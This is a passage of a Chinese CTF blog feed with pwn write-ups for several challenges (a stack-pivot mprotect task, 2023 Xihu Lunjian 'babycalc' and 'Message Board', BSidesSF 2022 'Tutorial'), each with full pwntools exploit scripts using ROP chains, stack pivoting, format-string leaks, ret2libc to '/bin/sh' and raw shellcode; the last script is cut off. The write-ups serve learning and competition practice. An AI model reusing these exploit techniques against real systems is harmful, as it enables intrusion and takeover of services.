alt="image-20221007214008908"></p><p>此时是栈迁移时寄存器的值，我们发现rdx的值正好是7，而我们最终要想办法执行mprotect函数的值也要是7，因此rdx的值就可以直接利用，不需要再去改变了(这个rdx是strlen函数执行后给write函数残留下来的)，同时rsi的值对于mprotect函数来说是更改内存权限的大小，很明显此时的rsi作为大小的话，也是ok的。</p><p>因此最后我们只需要将rdi控制住即可，想办法将rdi改成0x3ff000这个地址(因为我选择迁移到这个地址上)，之所以没迁移到bss段上是因为程序执行了mprotect函数，将0x400000以及后面0x402000 0x403000这几个区域的权限都改成了r，因此数据写不进去了…所以只能选择迁移到上面的0x3ff000处。</p><p><img src="../img/image-20221007214023209.png" alt=""></p><h3 id="控制rdi寄存器">控制rdi寄存器</h3><p>接下来就是考虑怎么控制rdi寄存器，可以说控制rdi是布置rop链的核心，如果这里搞定了，剩下的也很容易搞定，如果这里卡住的话，就没法继续下去了</p><p>我们先使用Ropgadget搜一下，发现没有能控制rdi或者edi的寄存器的gadget</p><p><img src="../img/image-20221007214034627.png" alt=""></p><p>因此我们只能去间接控制rdi的值，我们将目光转到call mprotect之前的汇编上。</p><p><img src="../img/image-20221007214042643.png" alt="image-20221007214042643"></p><p>发现rdi是rax给的。我们去看看，有没有gadget能控制rax或者eax</p><p><img src="../img/image-20221007214117512.png" alt="image-20221007214117512"></p><p>我们发现这个gadget似乎能控制eax，只要我们能控制rbp的话，最后发现很轻易的就可以用pop 来控制rbp(如下图)。所以我们通过rbp来控制eax，通过eax来控制mprotect函数的rdi寄存器。</p><p><img src="../img/image-20221007214127795.png" alt=""></p><p>因此我们在rop链上先写一个pop rbp;ret的指令，然后将[rbp-0x18]的值给eax(我们需要提前在rbp-0x18的位置布置好eax的值)，最后放上0x4012D5的地址即可正确执行mprotect函数了。</p><p><strong>有个伏笔要提一下，就是我们需要提前在rbp-0x18的地方布置我们的eax值(rbp的值改0x3ff000-8,因为我们要保证迁移后正好要到0x3ff000这个地址)，便于后续的rop。而这个值要产生就要在第一次read函数的时候将第二次read的buf改成0x3ff000-8。这样再输入的时候，我们就可以在0x3ff000-8的位置放成eax的值了，之后的0x3ff000就是pop rbp;ret的地址，然后再往下是rbp的值，接着就是mov eax, dword ptr [rbp - 0x18] ; leave ; ret指令的地址。而这个指令执行的时候[rbp-0x18]正好指向的就是eax的值(pop rbp的时候把rbp改成0x3ff000+0x10)这样才能保证执行mov eax, dword ptr [rbp - 0x18] ; leave ; ret指令中的leave;ret之后，再一次迁移还在rop链上。(这里的过程要是没理解的话，可以去对着脚本调试一下，应该就明白了，感觉我这么硬讲确实有点不容易理解hh)</strong></p><p>可以说这里的布局是一环扣一环，错一个地址都不行(可能其他师傅也有其他方法吧)</p><p>至此rop链的核心部分已经说明完了，最后填上0x4012D5这个地址(也就是call mprotect之前的那个mov rdi,rax),程序到这里之后，就会顺利成章的执行mprotect函数了。(效果如下图)</p><p><img src="../img/image-20221007214144313.png" alt="image-20221007214144313"></p><p>最后算好shellcode的地址，然后布置shellcode的地址到rop链上。最终即可获取shell。</p><p><img src="../img/image-20221007214154568.png" alt="image-20221007214154568"></p><h2 id="打远程的一个坑">打远程的一个坑:</h2><p>实际做题的时候，我只打通了本地，感觉确实都没有问题，但远程始终没有通，而且这道题我也是拉到21.10的docker中跑的，跟远程的libc也是一模一样的。然后懵了很久很久，最终 winmt 师傅提醒我说三次payload要一起发送(就是本来发三次payload，但是打远程需要3次的payload合成一个payload发送一次)才能打通远程，emmm，这个结论的原因师傅们也没有给出一个明确的答案，所以关于这个问题暂且不谈。</p><p>不过有个问题就是一次都将数据发送给fgets函数，正常来说多余的字节都存留在了输入缓冲区，但是read函数并不存输入缓冲区中读入数据。可read函数最后也确实接收到了数据…因此我对这里感到非常疑惑。最终请教了 winmt 师傅和 roderick 师傅，终于才搞明白这里。因为setvbuf函数将输入缓冲区设置为了每次读入一个字符，正常情况下fgets函数是读入数据遇到\n为止，将这些数据全部读入到输入缓冲区中，然后再从输入缓冲区中读入n-1个字符。而setvbuf函数执行后fgets函数就变成了从缓冲区中一个字符一个字符读入后，再将字符给到指定内存地址。因此读入n-1字符后自然就停止了，而后面一起发送的数据则留在了stdin中，最后read(0,buf,length)的时候自然就从stdin中读出来了数据。</p><p>最后打通了，别忘了将输出重定向~</p><h2 id="EXP">EXP:</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;a&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;39.107.237.149&#x27;</span>,<span class="number">12998</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#debug(p,0x40145e,0x4014E3,0x401512)</span></span><br><span class="line"><span class="comment">#p.sendlineafter(&#x27;please input your filename\n&#x27;,0x20*b&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment">#debug(p,0x40145E)</span></span><br><span class="line">leave_ret=<span class="number">0x401511</span></span><br><span class="line">addr=<span class="number">0x3ff000</span></span><br><span class="line">add_rax=<span class="number">0x401297</span></span><br><span class="line">mov_eax=<span class="number">0x401351</span></span><br><span class="line">pop_rbp_addr=<span class="number">0x000000000040129d</span></span><br><span class="line">main_addr=<span class="number">0x401513</span></span><br><span class="line">payload=<span class="number">0x20</span>*<span class="string">b&#x27;a&#x27;</span>+(<span class="number">0x14</span>)*<span class="string">b&#x27;c&#x27;</span>+p64(addr-<span class="number">8</span>)+p64(addr-<span class="number">8</span>)+p64(leave_ret)+p64(<span class="number">0x3ff000</span>)+p64(pop_rbp_addr)+p64(<span class="number">0x3ff000</span>-<span class="number">8</span>+<span class="number">0x18</span>)+p64(mov_eax)+p64(<span class="number">0x4012D5</span>)+p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x3ff030</span>)+shellcode_store(<span class="string">&#x27;shell_64&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;please input your filename\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendafter(&#x27;Please write the data you want to discard\n&#x27;,(0x14)*b&#x27;c&#x27;+p64(addr-8)+p64(addr-8)+p64(leave_ret))</span></span><br><span class="line"><span class="comment">#payload=p64(0x3ff000)+p64(pop_rbp_addr)+p64(0x3ff000-8+0x18)+p64(mov_eax)+p64(0x4012D5)+p64(0xdeadbeef)+p64(0x3ff030)+shellcode_store(&#x27;shell_64&#x27;)</span></span><br><span class="line"><span class="comment">#p.sendlineafter(&#x27;please input your new data\n&#x27;,payload)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023西湖论剑 PWN 部分WP</title>
      <link href="/posts/1c9fd873.html"/>
      <url>/posts/1c9fd873.html</url>
      
        <content type="html"><![CDATA[<p>一共五个 <code>PWN</code> ，有两个零解，还有一个很少解的题目，本人菜鸡选手做不出来，估计后面复现也够呛，就记录一下比赛做出来的两个常规 <code>PWN</code>。</p><h2 id="babycalc">babycalc</h2><h3 id="保护策略">保护策略</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021853480.png" alt="image-20230202185343223"></p><h3 id="漏洞所在">漏洞所在</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021855407.png" alt="image-20230202185510362"></p><p>溢出了 <code>rbp</code> 末字节为 <code>\x00</code> ，并且往 <code>buf</code> 里输入数据的时候可以控制如下所有变量</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021856648.png" alt="image-20230202185640585" style="zoom:50%;" /><p>结合这一行代码 <code>*(&amp;v3 + i) = v0;</code> ，因为 <code>i</code> 是可以控制的，所以此处有一次的任意栈地址单字节写入的机会，通过 <code>gdb</code> 调试发现返回地址和 <code>leave ; ret</code> 指令的地址前两个字节都一样，所以向返回地址末尾写入 <code>\x17</code> ，以此来作出 <code>leave ; ret</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021901380.png" alt="image-20230202190116289"></p><p>需要注意的是因为将 <code>i</code> 改大之后，下一次的循环就一定进不去了，所以这个任意栈地址写单字节只有一次机会。同时将 <code>buf</code> 写满，让 <code>rbp</code> 末尾为  <code>0</code> （此时 <code>rbp</code> 指向了 <code>buf</code> 中的数据）也就意味着接下来触发栈迁移，会迁移到我们可控的地方执行 <code>rop</code></p><p>上述成功的前提是要把这个方程组给解出来，先安装下 <code>z3</code> 这个包 ，然后用 <code>python</code> 跑一下即可，脚本如下</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">v3=Int(<span class="string">&#x27;v3&#x27;</span>)</span><br><span class="line">v4=Int(<span class="string">&#x27;v4&#x27;</span>)</span><br><span class="line">v5=Int(<span class="string">&#x27;v5&#x27;</span>)</span><br><span class="line">v6=Int(<span class="string">&#x27;v6&#x27;</span>)</span><br><span class="line">v7=Int(<span class="string">&#x27;v7&#x27;</span>)</span><br><span class="line">v8=Int(<span class="string">&#x27;v8&#x27;</span>)</span><br><span class="line">v9=Int(<span class="string">&#x27;v9&#x27;</span>)</span><br><span class="line">v10=Int(<span class="string">&#x27;v10&#x27;</span>)</span><br><span class="line">v11=Int(<span class="string">&#x27;v11&#x27;</span>)</span><br><span class="line">v12=Int(<span class="string">&#x27;v12&#x27;</span>)</span><br><span class="line">v13=Int(<span class="string">&#x27;v13&#x27;</span>)</span><br><span class="line">v14=Int(<span class="string">&#x27;v14&#x27;</span>)</span><br><span class="line">v15=Int(<span class="string">&#x27;v15&#x27;</span>)</span><br><span class="line">v16=Int(<span class="string">&#x27;v16&#x27;</span>)</span><br><span class="line">v17=Int(<span class="string">&#x27;v17&#x27;</span>)</span><br><span class="line">v18=Int(<span class="string">&#x27;v18&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add((v17 + v16 * v15) * v18 == <span class="number">0x11376</span>)</span><br><span class="line">s.add(v5 * v4 * v3 - v6 == <span class="number">0x8D56</span>)</span><br><span class="line">s.add(v3 == <span class="number">0x13</span>)</span><br><span class="line">s.add(v5 * <span class="number">0x13</span> * v4 + v6 == <span class="number">0x8DE2</span>)</span><br><span class="line">s.add((v13 + v3 - v8) * v16 == <span class="number">0x8043</span>)</span><br><span class="line">s.add((v4 * v3 - v5) * v6 == <span class="number">0xAC8A</span>)</span><br><span class="line">s.add((v5 + v4 * v3) * v6 == <span class="number">0xC986</span>)</span><br><span class="line">s.add(v9 * v8 * v7 - v10 == <span class="number">0xF06D</span>)</span><br><span class="line">s.add(v10 * v15 + v4 + v18 == <span class="number">0x4A5D</span>)</span><br><span class="line">s.add(v9 * v8 * v7 + v10 == <span class="number">0xF1AF</span>)</span><br><span class="line">s.add((v8 * v7 - v9) * v10 == <span class="number">0x8E03D</span>)</span><br><span class="line">s.add(v11 == <span class="number">0x32</span>)</span><br><span class="line">s.add((v9 + v8 * v7) * v10 == <span class="number">0x8F59F</span>)</span><br><span class="line">s.add(v13 * v12 * v11 - v14 == <span class="number">0x152FD3</span>)</span><br><span class="line">s.add(v13 * v12 * v11 + v14 == <span class="number">0x15309D</span>)</span><br><span class="line">s.add((v12 * v11 - v13) * v14 == <span class="number">0x9C48A</span>)</span><br><span class="line">s.add((v11 * v5 - v16) * v12 == <span class="number">0x4E639</span>)</span><br><span class="line">s.add((v13 + v12 * v11) * v14 == <span class="number">0xA6BD2</span>)</span><br><span class="line">s.add(v17 * v16 * v15 - v18 == <span class="number">0x8996D</span>)</span><br><span class="line">s.add(v17 * v16 * v15 + v18 == <span class="number">0x89973</span>)</span><br><span class="line">s.add(v14 == <span class="number">0x65</span>)</span><br><span class="line">s.add((v16 * v15 - v17) * v18 == <span class="number">0x112E6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><p>求解后的值</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021907794.png" alt="image-20230202190705641" style="zoom:50%;" /><p>上述栈迁移后，执行的是栈里的 <code>rop</code> ，因为 <code>rdx</code> 是一个比较大的值，所以直接调用 <code>read</code> 函数向 <code>bss</code> 段写入数据（这个地址找高点，不然之后执行 <code>system</code> 函数开辟栈帧可能会覆盖一些其他指针），然后程序中是存在这个  <code>pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</code> ,利用这个 <code>gadget</code> 可以再进行一次栈迁移（因为栈里无法布置太长的 <code>rop</code> 链，只能迁移到 <code>bss</code> 段上）</p><p>迁移到 <code>bss</code> 段上后再打一次 <code>ret2libc</code> 即可</p><p><strong>注意：</strong> 因为栈随机化的原因，<code>rbp</code> 的末尾覆盖为 <code>\x00</code> 后，不是一定能指向 <code>rop</code> 链的开始部分，而是在一个区域内随机的，所以在 <code>rop</code> 上面写满 <code>ret</code> 指令，滑到 <code>rop</code> 链上成功的概率会大一点。</p><p>放几张调试时的图片</p><p>下面是执行到 <code>puts(&quot;good done&quot;)</code> 时，栈中的情况，可以看到返回地址已经变成了 <code>nop ; leave ; ret</code> 的地址， <code>rbp</code> 指向了上面 <code>ret</code> 的部分，而 <code>ret</code> 下面就是 <code>rop链</code> ，该 <code>rop</code> 链是向 <code>bss</code> 段写入 <code>ret2libc</code> 的 <code>payload</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021938029.png" alt="image-20230202193808421"></p><p>第二次栈迁移</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021941345.png" alt="image-20230202194109919"></p><p>执行 <code>puts</code> 函数泄露 <code>libc</code> 地址，此时栈已经迁移到了 <code>bss</code> 段上</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021942043.png" alt="image-20230202194207428" style="zoom:50%;" /><p>最后触发 <code>system</code> 函数，获取 <code>shell</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021943748.png" alt="image-20230202194320318"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021943035.png" alt="image-20230202194345788"></p><h3 id="EXP">EXP</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;b&#x27;</span>,<span class="string">&quot;tcp.cloud.dasctf.com:21323&quot;</span>)</span><br><span class="line"></span><br><span class="line">v3 = <span class="number">19</span></span><br><span class="line">v11 = <span class="number">50</span></span><br><span class="line">v14 = <span class="number">101</span></span><br><span class="line">v18 = <span class="number">3</span></span><br><span class="line">v10 = <span class="number">161</span></span><br><span class="line">v12 = <span class="number">131</span></span><br><span class="line">v5 = <span class="number">53</span></span><br><span class="line">v16 = <span class="number">199</span></span><br><span class="line">v7 = <span class="number">55</span></span><br><span class="line">v9 = <span class="number">17</span></span><br><span class="line">v15 = <span class="number">118</span></span><br><span class="line">v17 = <span class="number">24</span></span><br><span class="line">v6 = <span class="number">70</span></span><br><span class="line">v4 = <span class="number">36</span></span><br><span class="line">v13 = <span class="number">212</span></span><br><span class="line">v8 = <span class="number">66</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400ca3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000400ca1</span></span><br><span class="line">bss_addr=<span class="number">0x602510</span></span><br><span class="line">pop_rsp_r13_r14_r15=<span class="number">0x0000000000400c9d</span></span><br><span class="line">ret=<span class="number">0x400C3E</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop=p64(pop_rdi)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(pop_rsi_r15)+p64(bss_addr)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(e.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop+=p64(pop_rsp_r13_r14_r15)</span><br><span class="line">rop+=p64(bss_addr-<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;\x32\x33&#x27;</span>+ <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">86</span>-<span class="number">0x40</span>) <span class="comment">#206</span></span><br><span class="line">pay+=p64(ret)*<span class="number">0xf</span></span><br><span class="line">pay+= rop</span><br><span class="line"></span><br><span class="line">pay += p8(v3)</span><br><span class="line">pay += p8(v4)</span><br><span class="line">pay += p8(v5)</span><br><span class="line">pay += p8(v6)</span><br><span class="line">pay += p8(v7)</span><br><span class="line">pay += p8(v8)</span><br><span class="line">pay += p8(v9)</span><br><span class="line">pay += p8(v10)</span><br><span class="line">pay += p8(v11)</span><br><span class="line">pay += p8(v12)</span><br><span class="line">pay += p8(v13)</span><br><span class="line">pay += p8(v14)</span><br><span class="line">pay += p8(v15)</span><br><span class="line">pay += p8(v16)</span><br><span class="line">pay += p8(v17)</span><br><span class="line">pay += p8(v18)</span><br><span class="line">pay+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x100</span>-<span class="number">0xe0</span>-<span class="number">4</span>)+<span class="string">b&#x27;\x38\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    p.sendafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">b&#x27;1\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="number">0x400BA6</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;:&#x27;</span>, pay)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">rop2=p64(pop_rdi)+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">rop2+=p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">rop2+=p64(pop_rdi)+p64(<span class="number">0</span>)</span><br><span class="line">rop2+=p64(pop_rsi_r15)+p64(bss_addr+<span class="number">0x48</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop2+=p64(e.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">p.sendline(rop2)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;puts_addr&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base +<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">rop1=p64(<span class="number">0x400BB8</span>)+p64(pop_rdi)+p64(bin_sh_addr)+p64(sys_addr)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(rop1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Message-Board">Message Board</h2><p>这个题格式化字符串漏洞泄露栈地址和 <code>libc</code> 地址，然后栈迁移再打 <code>mprotect</code> 函数和 <code>orw</code> 的 <code>shellcode</code> 即可， 比较简单就不写过程了</p><h3 id="EXP-v2">EXP</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn1&quot;</span>,<span class="string">&quot;tcp.cloud.dasctf.com:20516&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;%p%31$p&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to DASCTF message board, please leave your name:\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x24083</span></span><br><span class="line">log_addr(<span class="string">&#x27;stack_addr&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x40138C</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000401413</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401411</span></span><br><span class="line">pop_rdx_ret=libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">rop=p64(pop_rdi)+p64(stack_addr&amp;<span class="number">0xfffffffffff000</span>)</span><br><span class="line">rop+=p64(pop_rsi_r15)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(pop_rdx_ret)+p64(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">rop+=p64(libc_base+libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">rop+=p64(stack_addr+<span class="number">0x58</span>)<span class="comment">#48</span></span><br><span class="line">rop+=<span class="string">b&quot;\x6A\x00\x5F\x6A\x03\x58\x0F\x05\x48\xBE\x2F\x66\x6C\x61\x67\x00\x00\x00\x56\x54\x5E\x6A\x00\x5F\x6A\x00\x5A\x68\x01\x01\x00\x00\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line">rop+=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xb0</span>-<span class="number">60</span>-<span class="number">0x48</span>)</span><br><span class="line">rop+=p64(stack_addr+<span class="number">0x10</span>-<span class="number">8</span>)</span><br><span class="line">rop+=p64(<span class="number">0x4013A2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Now, please say something to DASCTF:\n&quot;</span>,rop)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021952429.png" alt="image-20230202195232240"></p>]]></content>
      
      
      <categories>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> orw </tag>
            
            <tag> 栈迁移 </tag>
            
            <tag> 求解方程组 </tag>
            
            <tag> ret2libc </tag>
            
            <tag> 格式化字符串漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BSidesSF 2022 CTF</title>
      <link href="/posts/de6602ce.html"/>
      <url>/posts/de6602ce.html</url>
      
        <content type="html"><![CDATA[<p>第一次打国外的比赛，由于好几道pwn题出的非常萌新，所以做起来比较舒服（我做出来了三道shellcode闯关和两道无保护的栈题）。其中有两道题的代码是一样的，一个是32位的，一个是64位的。整体利用思路一样，我就详细说一下32位的,64位的这个题同理。</p><h1>Tutorial</h1><p>这道题32位和64位的附件我上传到了百度网盘 需要的话可以下载  <a href="https://pan.baidu.com/s/1Usr3W-rE56rAL6v1FZ9qGw?pwd=sfaj">https://pan.baidu.com/s/1Usr3W-rE56rAL6v1FZ9qGw?pwd=sfaj</a> 提取码：sfaj</p><h2 id="保护策略：">保护策略：</h2><img src="https://s2.loli.net/2022/06/06/sNCMezaOjPIE9TB.png" alt="image-20220604212148738" style="zoom:50%;" /><p>只要看到没开NX，就往shellcode方面考虑。</p><h2 id="漏洞分析：">漏洞分析：</h2><p><img src="https://s2.loli.net/2022/06/06/ravABjUV8EmO3f5.png" alt="image-20220604212652290"></p><p>这里程序泄露了好几个地址，并且还给了提示，说只能输入16进制的字符。结合提示继续往下分析。</p><img src="https://s2.loli.net/2022/06/06/zrvmtiUA5u94wOF.png" alt="image-20220604212709635" style="zoom:50%;" /><p>程序正常可以无限次的read函数，每次可以输入0x40字节。</p><img src="https://s2.loli.net/2022/06/06/peFn2xCfXPIG7qD.png" alt="image-20220604212728654" style="zoom: 33%;" /><p>（结合上图）发现这个buf并不能溢出，也不能干扰到任何数据。</p><img src="https://s2.loli.net/2022/06/06/lXYNKCBTd16axVh.png" alt="image-20220605184815671" style="zoom:50%;" /><p>（结合上图）问题出在v2上面，由于read无限次被循环执行,v2却始终没有被清零，意味只要return不被触发，v2就这个下标无限制，可以一直往高地址去写入数据。再看一下decodehex这个函数（下图）</p><img src="https://s2.loli.net/2022/06/06/bBkYuNg3m21ZMFH.png" alt="image-20220604212854398" style="zoom:50%;" /><p>发现这里有个检查，要确定我们输入的数据是否属于0~9 a~f A~F。如果不是在这个范围的话则会返回-1。</p><p><img src="https://s2.loli.net/2022/06/06/zr6kZDycuvI7eba.png" alt="image-20220605183435486"></p><p>如果返回-1的话，这个主函数就会退出了，否则就可以把这个字符存在栈里的这个位置（如下图）</p><img src="https://s2.loli.net/2022/06/06/XaKo4EHBMrRnkWS.png" alt="image-20220605183958746" style="zoom:50%;" /><p>可以发现这是在当前函数的返回地址下面，猛一看似乎感觉也不能修改当前函数的返回地址。不过调试一下就发现，challenge函数的返回地址在输入点的下面（这就意味着challenge函数的返回地址是可以被溢出修改的）结合上面分析的，v2没有被清零导致了数据可以无限往下输入造成溢出。</p><p><img src="https://s2.loli.net/2022/06/06/nOcv46uWkPiCIo5.png" alt="image-20220605184725900"></p><h2 id="利用思路：">利用思路：</h2><p>由于没开NX，最后获取shell的方式考虑用shellcode，不过shellcode没法第一次就直接写进去，因为即使是用纯字符的shellcode，也无法绕过检查（只有在0-9 a-f A-F之间才能通过检查，纯字符的shellcode会有其他字符)我考虑过把shellcode放到0x40的一次输入里面，然后迁移过去执行，不过由于read一次只能读入0x40，而生成的shellcode有一百二十多个字节，因此这个方法也不行。**最终的方法是劫持执行流，再执行一次read函数（控制参数，劫持返回地址为jmp esp）把shellcode精准写到jmp esp下面的地址即可获取shell。**至于再输入的这个shellcode是字符型的还是字节流无所谓了。</p><img src="https://s2.loli.net/2022/06/06/tr6YAaVousmU3c7.png" alt="image-20220605190520975" style="zoom: 50%;" /><img src="https://s2.loli.net/2022/06/06/ypfbWhX5kPmlDrE.png" alt="image-20220605190652373" style="zoom:50%;" /><blockquote><p>为什么要用jmp esp这个指令？</p><p>ret指令相当于pop eip，如果执行ret指令时栈顶的内容是shellcode机器码，那么就会把机器码弹给eip，但是eip仅仅要的是一个指令的地址而已，你却弹给它了一个机器码，因此程序就会崩溃。所以需要用jmp esp，也就是跳转到esp中存储的地址处（也就是跳转到shellcode的地址），进而执行shellcode。</p><p>劫持执行流的偏移是怎么得到的？</p><p>这个通过IDA是看不出来（也可能是我比较菜QAQ），然后通过gdb去调试，输入一些垃圾字符，看看输入到多少的时候可以溢出到challenge的返回地址。</p></blockquote><p><strong>需要注意的是，经过调试，写入栈里的地址数据是反着存储的，因此exp上写的地址应该反着写，存储的时候就正了。</strong></p><h2 id="EXP：">EXP：</h2><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;tutorial-f0115733.challenges.bsidessf.net&#x27;,3232)</span></span><br><span class="line"><span class="comment">#debug(p,0x080492C7)</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">xor ebx,ebx </span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;由于栈地址是随机的，所以写了个函数将接收的栈地址给转换一下&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">sum</span>=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        b=(a&gt;&gt;(i*<span class="number">8</span>))&amp;<span 